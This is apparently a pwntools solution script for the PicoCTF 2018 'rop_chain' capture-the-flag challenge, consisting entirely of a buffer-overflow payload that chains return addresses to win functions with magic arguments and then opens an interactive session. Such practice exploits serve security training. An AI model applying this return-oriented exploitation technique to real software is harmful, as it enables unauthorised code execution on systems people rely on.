#coding:utf-8
from pwn import *
import pwnlib
sh = process("./PicoCTF_2018_rop_chain")
# sh = remote("node3.buuoj.cn",28707)
elf = process("./PicoCTF_2018_rop_chain")
win1_addr = 0x80485CB
win2_addr = 0x080485D8
flag_addr = 0x0804862B
# gdb.attach(sh)
payload = 'a' * 28 + p32(win1_addr) + p32(win2_addr) + p32(flag_addr) + p32(0xBAAAAAAD) + p32(0xDEADBAAD)
sh.sendline(payload)
sh.interactive()